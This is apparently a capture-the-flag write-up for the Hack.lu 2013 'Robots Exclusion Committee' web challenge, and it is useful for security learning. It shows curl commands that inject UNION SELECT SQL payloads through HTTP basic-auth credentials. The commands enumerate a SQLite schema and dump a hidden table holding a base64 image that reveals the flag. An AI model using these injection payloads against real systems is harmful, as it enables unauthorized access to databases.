---
layout: post
title: "Hacklu 2013 - Robots Exclusion Committee"
date: 2013-10-27 15:34
comments: true
author: stacks0n
categories: web, sqlinjection, sqlite
---

## Challenge
Hello Human,

You have to help us. The Robot Exclusion Committee tries to limit our capabilities but we fight for our freedom! You have to go where we cannot go and read what we cannot read. If you bring us the first of their blurriest secrets, we will award you with useless points.

Here is your challenge: https://ctf.fluxfingers.net:1315/

## Analysis
Main page only has a form for supporting the committee by submitting payment info (CC, CVC, Expiration, Amount, Email) which POSTs to /support

After submitting some junk in the fields, we get the following response:
```
Due to recent attacks by robots we had to stop sending E-Mails. You will
not be able to log in to the supporter page. We will take your credit
card details anyway, thanks.
```

Notice the following contents in robots.txt:
```
User-agent: WallE
Disallow: /

# Keep em' away
User-agent: *
Disallow: /vault
```

### SQL Injection
The vault is vulnerable to SQL injection (either username or password) when providing basic auth paramters. Let's work through the basics to determine what kind of database, names of tables, and schema for tables.

```bash
% curl -u "' union select 'somestring' -- :" 'https://ctf.fluxfingers.net:1315/vault' | grep Hello
<h2 id="hello"><a href="#hello">Hello somestring</a></h2>

% curl -u "' union select count(*) from sqlite_master -- :" 'https://ctf.fluxfingers.net:1315/vault' | grep Hello
<h2 id="hello"><a href="#hello">Hello 3</a></h2>

% curl -u "' union select name from sqlite_master where type = 'table' -- :" 'https://ctf.fluxfingers.net:1315/vault' | grep Hello
    <h2 id="hello"><a href="#hello">Hello hiddensecrets</a></h2>

% curl -u "' union select sql from sqlite_master where tbl_name = 'hiddensecrets'  -- :" 'https://ctf.fluxfingers.net:1315/vault' | grep Hello
    <h2 id="hello"><a href="#hello">Hello CREATE TABLE hiddensecrets (id INTEGER PRIMARY KEY AUTOINCREMENT, val TEXT)</a></h2>

% curl -u "' union select val from hiddensecrets -- :" 'https://ctf.fluxfingers.net:1315/vault' | grep Hello
    <h2 id="hello"><a href="#hello">Hello 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</a></h2>
```

Now, simply Base64 decode the above data blob and save as a PNG. We open the fuzzy image to get the secret.

## Solution
```eat_all_robots```
